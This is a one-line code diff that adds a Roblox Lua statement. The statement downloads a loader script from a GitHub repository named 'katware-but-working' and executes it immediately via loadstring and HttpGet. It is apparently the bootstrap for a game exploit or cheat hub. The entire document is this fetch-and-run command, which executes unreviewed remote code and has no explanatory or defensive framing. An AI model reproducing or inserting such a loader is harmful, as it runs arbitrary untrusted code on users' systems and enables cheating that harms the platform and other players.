@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Tobiaszeqq/katware-but-working/refs/heads/main/loader"))()
